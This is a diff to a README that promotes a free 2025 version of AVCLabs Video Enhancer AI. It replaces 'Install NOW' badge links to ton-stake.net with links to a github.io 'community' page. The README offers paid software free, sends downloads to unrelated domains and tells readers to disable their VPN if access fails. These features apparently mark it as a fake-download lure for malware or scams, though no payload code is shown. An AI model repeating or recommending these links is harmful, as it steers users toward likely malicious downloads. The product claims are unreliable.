@@ -5,9 +5,9 @@
 
 **Description**: Upgrade your videos with **AVCLabs Video Enhancer AI 2025**, offering free AI editing access for stunning results! This repository provides tutorials, resources, and tips to explore AVCLabs’ neural network features for upscaling and denoising. Download your free version and join our vibrant community in 2025!  
 
-[![Install AVCLabs Video Enhancer AI 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://avclabsvideoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 📋 Installation Guide  
 
@@ -28,9 +28,9 @@ Enhance your videos with these simple steps to set up AVCLabs Video Enhancer AI 
 5. **Access Problems?** 🌐  
    If access fails, disable your VPN or switch browsers (e.g., Chrome, Firefox).  
 
-[![Install AVCLabs Video Enhancer AI 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://avclabsvideoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose AVCLabs Video Enhancer AI 2025  
 
